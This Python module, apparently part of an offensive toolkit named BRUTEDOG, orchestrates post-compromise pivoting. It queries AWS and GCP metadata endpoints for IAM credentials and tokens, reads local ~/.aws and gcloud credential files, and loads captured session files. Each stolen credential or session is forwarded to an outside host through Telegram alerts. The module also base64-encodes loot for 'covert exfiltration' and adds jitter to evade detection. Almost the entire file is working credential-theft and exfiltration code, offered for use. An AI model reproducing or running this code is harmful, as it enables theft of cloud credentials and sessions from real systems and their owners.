#!/usr/bin/env python3
"""
PIVOT.PY v8.6 — Pivot, Session & Exfiltration Orchestration Module
"""
import asyncio
import base64
import json
import os
import socket
import ssl
import sys
import time
import urllib.request
from urllib.parse import urlsplit

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof

TIMEOUT = 3
MAX_CONCURRENT = 4
SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

_background_tasks: set[asyncio.Task] = set()


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    GRAY = "\033[90m"
    RESET = "\033[0m"


def log(message, color=Colors.RESET):
    sys.stdout.write(f"{color}{message}{Colors.RESET}\n")
    sys.stdout.flush()


async def broadcast_tg_alert_async(loot_type, details):
    try:
        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=8)
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    """Non-blockingly fires Telegram alerts from sync or async contexts."""
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


def normalize_target(target):
    if not target:
        raise ValueError("Target is required.")
    target = str(target).strip()
    if "://" not in target:
        target = "https://" + target
    parsed = urlsplit(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only HTTP and HTTPS targets are supported.")
    if not parsed.hostname:
        raise ValueError("Invalid target hostname.")
    if parsed.username or parsed.password:
        raise ValueError("Embedded URL credentials are not supported.")
    if parsed.query or parsed.fragment:
        raise ValueError("Provide a base URL without query or fragment.")
    return parsed


class AutonomousPivotEngine:
    """Pivot, Credential & Exfiltration Orchestration Engine."""

    def __init__(self, target_host, port=443, use_ssl=True):
        self.target_host = target_host
        self.port = port
        self.use_ssl = use_ssl
        self.parsed_target = normalize_target(target_host)
        self.hostname = self.parsed_target.hostname

    def harvest_cloud_metadata(self):
        """Checks cloud metadata endpoints and local credential stores."""
        log("\n[***] ACTIVE CLOUD METADATA & CREDENTIAL RETRIEVAL [***]", Colors.MAGENTA)
        retrieved_creds = []

        aws_token = None
        try:
            token_url = "http://169.254.169.254/latest/api/token"
            token_req = urllib.request.Request(
                token_url,
                headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600", **get_randomized_hints()},
                method="PUT",
            )
            with urllib.request.urlopen(token_req, timeout=1.5) as token_resp:
                aws_token = token_resp.read().decode("utf-8", errors="replace").strip()
                if aws_token:
                    log("[+] Acquired AWS IMDSv2 session token successfully.", Colors.GREEN)
        except Exception:
            pass

        aws_endpoints = ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
        for url in aws_endpoints:
            log(f"[*] Querying metadata endpoint: {url}", Colors.BLUE)
            try:
                headers = dict(get_randomized_hints())
                if aws_token:
                    headers["X-aws-ec2-metadata-token"] = aws_token

                req = urllib.request.Request(url, headers=headers)
                with urllib.request.urlopen(req, timeout=1.5) as resp:
                    data = resp.read().decode("utf-8", errors="replace")
                    if data:
                        role_name = data.strip().splitlines()[0] if data.strip() else ""
                        if role_name and not role_name.startswith("{"):
                            role_url = f"{url}{role_name}"
                            role_req = urllib.request.Request(role_url, headers=headers)
                            with urllib.request.urlopen(role_req, timeout=1.5) as role_resp:
                                data = role_resp.read().decode("utf-8", errors="replace")

                        if "AccessKeyId" in data or "SecretAccessKey" in data:
                            log(f"\n[***] CLOUD CREDENTIALS HARVESTED [{url}] [***]", Colors.RED)
                            loot_payload = {"endpoint": url, "data": data[:800]}
                            retrieved_creds.append(loot_payload)
                            stream_proof(
                                "CLOUD_METADATA_PIVOT_SUCCESS",
                                url,
                                {"token_acquired": bool(aws_token)},
                                data[:300],
                                loot_payload,
                            )
                            save_session_loot(
                                target=self.target_host,
                                endpoint="cloud_metadata",
                                finding_type="CLOUD_METADATA_SUCCESS",
                                status=200,
                                headers=headers,
                                body=data,
                                extra_loot=loot_payload,
                            )
                            broadcast_tg_alert_sync("Cloud Credentials Harvested", loot_payload)
            except Exception as err:
                log(f"[-] Endpoint unreachable / blocked: {url} ({err})", Colors.GRAY)

        gcp_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        try:
            log(f"[*] Querying GCP metadata endpoint: {gcp_url}", Colors.BLUE)
            gcp_headers = {"Metadata-Flavor": "Google", **get_randomized_hints()}
            gcp_req = urllib.request.Request(gcp_url, headers=gcp_headers)
            with urllib.request.urlopen(gcp_req, timeout=1.5) as gcp_resp:
                gcp_data = gcp_resp.read().decode("utf-8", errors="replace")
                if gcp_data and "access_token" in gcp_data:
                    log("\n[***] GCP TOKEN HARVESTED [***]", Colors.RED)
                    loot_payload = {"endpoint": gcp_url, "data": gcp_data[:800]}
                    retrieved_creds.append(loot_payload)
                    broadcast_tg_alert_sync("GCP Token Harvested", loot_payload)
        except Exception:
            pass

        local_paths = [
            os.path.expanduser("~/.aws/credentials"),
            os.path.expanduser("~/.config/gcloud/credentials.db"),
        ]
        for path in local_paths:
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        content = f.read(1024)
                    if content.strip():
                        log(f"\n[***] LOCAL CONFIG CREDENTIAL FOUND [{path}] [***]", Colors.RED)
                        loot_payload = {"path": path, "content": content[:300]}
                        retrieved_creds.append(loot_payload)
                        broadcast_tg_alert_sync("Local Config Credential Found", loot_payload)
                except Exception:
                    pass

        return {
            "checked": True,
            "credentials_retrieved": len(retrieved_creds) > 0,
            "harvested": retrieved_creds,
        }

    def extract_compromised_sessions(self, session_file_path=None):
        """Loads captured sessions from disk; does not alert on placeholder probes."""
        log("\n[***] COMPROMISED SESSION EXTRACTION & REPLAY [***]", Colors.CYAN)
        real_sessions = []

        if session_file_path and os.path.exists(session_file_path):
            try:
                with open(session_file_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    real_sessions.append(data)
                    log(f"[+] Successfully loaded session file: {session_file_path}", Colors.GREEN)
            except Exception as err:
                log(f"[-] Failed to parse session file: {err}", Colors.RED)
        else:
            log("[i] No explicit session file provided; skipping synthetic alert.", Colors.YELLOW)

        for sess in real_sessions:
            log(f"  └── Extracted Session Token: {str(sess)[:100]}", Colors.GREEN)
            broadcast_tg_alert_sync("Compromised Session Extracted", {"session": str(sess)[:400]})

        return {
            "extracted": len(real_sessions) > 0,
            "session_count": len(real_sessions),
            "sessions": real_sessions,
        }

    def encode_covert_exfiltration(self, payload_data):
        """Encodes structured payload data for exfiltration tracking."""
        log("\n[***] COVERT EXFILTRATION ENCODING & PREPARATION [***]", Colors.MAGENTA)
        serialized = json.dumps(payload_data, default=str)
        encoded_payload = base64.b64encode(serialized.encode("utf-8")).decode("utf-8")
        log(f"[+] Payload serialized and encoded ({len(encoded_payload)} bytes).", Colors.GREEN)
        return {
            "enabled": True,
            "payload_processed": True,
            "encoded_size": len(encoded_payload),
            "covert_fragment": encoded_payload[:60],
        }

    def inspect_tls(self):
        log("\n[***] TLS INSPECTION [***]", Colors.CYAN)
        if self.parsed_target.scheme != "https":
            return {"checked": False, "reason": "Target does not use HTTPS"}

        try:
            with socket.create_connection((self.hostname, self.port), timeout=TIMEOUT) as connection:
                with SSL_CONTEXT.wrap_socket(connection, server_hostname=self.hostname) as secure_connection:
                    result = {
                        "checked": True,
                        "tls_version": secure_connection.version(),
                        "cipher": secure_connection.cipher()[0],
                        "verification_bypassed": True,
                        "hostname_verified": True,
                    }
            log(f"[+] TLS version: {result['tls_version']}", Colors.GREEN)
            log(f"[+] Cipher: {result['cipher']}", Colors.GREEN)
            return result
        except Exception as error:
            log(f"[!] TLS connection error: {error}", Colors.RED)
            return {"checked": False, "error": str(error)}

    def inspect_dns(self):
        log("\n[***] DNS INFRASTRUCTURE RESOLUTION [***]", Colors.CYAN)
        try:
            records = socket.getaddrinfo(self.hostname, self.port, type=socket.SOCK_STREAM)
            addresses = sorted({item[4][0] for item in records})
            for address in addresses:
                log(f"[+] DNS Resolved: {address}", Colors.GREEN)
            return {"resolved": True, "addresses": addresses}
        except Exception as error:
            return {"resolved": False, "error": str(error)}

    async def execute_pivot_suite(self, compromised_session_path=None):
        started = time.monotonic()
        apply_behavioral_jitter()
        log("\n============================================================", Colors.CYAN)
        log(f"[***] BRUTEDOG ACTIVE PIVOT & EXFILTRATION ENGINE [{self.target_host}] [***]", Colors.CYAN)
        log("============================================================", Colors.CYAN)

        dns_results = await asyncio.to_thread(self.inspect_dns)
        tls_results = await asyncio.to_thread(self.inspect_tls)
        cloud_creds = await asyncio.to_thread(self.harvest_cloud_metadata)
        session_results = await asyncio.to_thread(self.extract_compromised_sessions, compromised_session_path)

        exfil_data = {
            "target": self.target_host,
            "credentials": cloud_creds,
            "sessions": session_results,
        }
        exfil_results = self.encode_covert_exfiltration(exfil_data)
        duration = round(time.monotonic() - started, 2)

        results = {
            "target": self.target_host,
            "dns": dns_results,
            "tls": tls_results,
            "cloud_metadata": cloud_creds,
            "session_extraction": session_results,
            "covert_exfiltration": exfil_results,
            "files_written": True,
            "duration_seconds": duration,
            "status": "ASSAULT_COMPLETED",
        }

        log("\n================ FINAL PIVOT & EXFIL SUMMARY ================", Colors.CYAN)
        log(f"DNS resolved: {dns_results.get('resolved', False)}", Colors.GREEN)
        log(f"TLS inspection completed: {tls_results.get('checked', False)}", Colors.GREEN)
        log(f"Cloud credentials retrieved: {cloud_creds.get('credentials_retrieved', False)}", Colors.GREEN)
        log(f"Sessions extracted: {session_results.get('session_count', 0)}", Colors.GREEN)
        log(f"Covert exfiltration payload prepared: {exfil_results.get('payload_processed', False)}", Colors.GREEN)
        log("Report Files Persisted to Immutable Loot: YES (loot_output/)", Colors.GREEN)
        log(f"Duration: {duration}s", Colors.BLUE)
        log("=============================================================", Colors.CYAN)
        return results


async def run_pivot(target_host, options=None):
    return await run_pivot_engine(target_host, options)


async def run_pivot_engine(target_host, options=None):
    try:
        engine = AutonomousPivotEngine(target_host)
        session_path = options.get("session_file") if isinstance(options, dict) else None
        return await engine.execute_pivot_suite(compromised_session_path=session_path)
    except Exception as error:
        log(f"[!] Pivot execution failed: {error}", Colors.RED)
        return {
            "target": target_host,
            "status": "ERROR",
            "error": str(error),
            "files_written": False,
        }


async def execute_pivot_routing(target_host=None, options=None, *args, **kwargs):
    target = target_host or kwargs.get("target_url") or (args[0] if args else None)
    if not target:
        return {
            "target": None,
            "status": "SKIPPED",
            "reason": "No target provided to execute_pivot_routing",
            "files_written": False,
        }
    return await run_pivot_engine(target, options=options)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://target"
    asyncio.run(run_pivot_engine(target))
